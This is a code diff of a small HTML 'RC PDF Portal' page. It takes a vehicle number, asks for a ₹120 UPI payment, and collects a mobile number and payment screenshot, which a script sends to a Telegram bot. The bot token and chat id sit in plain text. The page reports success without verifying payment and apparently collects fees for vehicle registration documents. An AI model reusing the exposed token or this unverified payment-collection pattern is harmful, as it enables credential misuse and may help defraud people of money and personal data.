@@ -1,58 +1,153 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>RC Payment</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RC PDF Portal</title>
 
 <style>
-body{margin:0;font-family:Arial;background:linear-gradient(270deg,red,blue,green,purple);animation:bg 10s infinite alternate;background-size:600% 600%;display:flex;justify-content:center;align-items:center;height:100vh}
-@keyframes bg{0%{background-position:0%}100%{background-position:100%}}
-.box{background:#000c;padding:25px;border-radius:18px;color:#fff;width:90%;max-width:400px;text-align:center}
-input,button{width:100%;padding:12px;margin-top:10px;border:none;border-radius:10px}
-button{background:#00ffd5;font-size:17px}
-img{margin:12px auto}
-</style>
+body{
+margin:0;
+font-family:Arial;
+background:linear-gradient(270deg,red,blue,green,purple);
+background-size:600% 600%;
+animation:bg 12s infinite alternate;
+display:flex;
+justify-content:center;
+align-items:center;
+min-height:100vh;
+}
 
-<div class="box">
-<h3>Vehicle Number</h3>
+@keyframes bg{
+0%{background-position:0%}
+100%{background-position:100%}
+}
+
+.card{
+background:#000c;
+color:white;
+padding:25px;
+border-radius:18px;
+width:92%;
+max-width:420px;
+text-align:center;
+}
+
+input,button{
+width:100%;
+padding:12px;
+margin-top:10px;
+border:none;
+border-radius:10px;
+font-size:16px;
+}
+
+button{background:#00ffd5;font-weight:bold;}
+
+.hidden{display:none;}
+
+img{
+width:220px;
+border-radius:14px;
+margin:12px 0;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+<!-- PAGE 1 -->
+<div id="p1">
+<h3>Enter Vehicle Number</h3>
 <input id="vehicle">
+<button onclick="goPay()">Continue</button>
+</div>
+
+<!-- PAGE 2 -->
+<div id="p2" class="hidden">
+<h3>Pay ₹120</h3>
 
 <img src="qr.png">
 
-<p>UPI: bestinsurance@upi</p>
+<p>UPI ID: bestinsurance@upi</p>
+
+<a href="upi://pay?pa=bestinsurance@upi&pn=BestInsurance&am=120&cu=INR">
+<button>Pay with UPI App</button>
+</a>
 
 <input id="mobile" placeholder="Mobile Number">
 
-<input type="file" id="proof">
+<input type="file" id="proof" accept="image/*">
 
-<button onclick="send()">Payment Done</button>
+<button onclick="submitPay()">Submit</button>
+</div>
 
-<p id="msg"></p>
+<!-- PAGE 3 -->
+<div id="p3" class="hidden">
+<h3>✅ Payment Successful</h3>
+<p>RC PDF jaldi mil jayega</p>
+</div>
+
 </div>
 
 <script>
 const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
 const chat="5600045707";
 
-function send(){
+function goPay(){
+if(!vehicle.value.trim()){
+alert("Vehicle number required");
+return;
+}
+p1.classList.add("hidden");
+p2.classList.remove("hidden");
+}
 
-let v=vehicle.value;
-let m=mobile.value;
+function submitPay(){
+
+let v=vehicle.value.trim();
+let m=mobile.value.trim();
 let p=proof.files[0];
 
-if(!v||m.length<10||!p){
-alert("Fill all & upload screenshot");
+if(m.length<10){
+alert("Mobile number required");
 return;
 }
 
-let f=new FormData();
-f.append("chat_id",chat);
-f.append("caption",`Vehicle: ${v}\nMobile: ${m}`);
-f.append("photo",p);
+if(!p){
+alert("Upload payment screenshot");
+return;
+}
 
-fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{method:"POST",body:f})
-.then(()=>msg.innerText="Sent for get RC ✅")
-.catch(()=>msg.innerText="Failed ❌");
+let data=new FormData();
+data.append("chat_id",chat);
+data.append("caption",`🚗 RC REQUEST\nVehicle: ${v}\nMobile: ${m}`);
+data.append("photo",p);
+
+fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
+method:"POST",
+body:data
+})
+.then(()=>{
+p2.classList.add("hidden");
+p3.classList.remove("hidden");
+alert("Payment submitted!");
+
+setTimeout(()=>{
+p3.classList.add("hidden");
+p1.classList.remove("hidden");
+vehicle.value="";
+mobile.value="";
+proof.value="";
+},3000);
+})
+.catch(()=>{
+alert("Telegram send failed");
+});
 }
 </script>
+
+</body>
+</html>
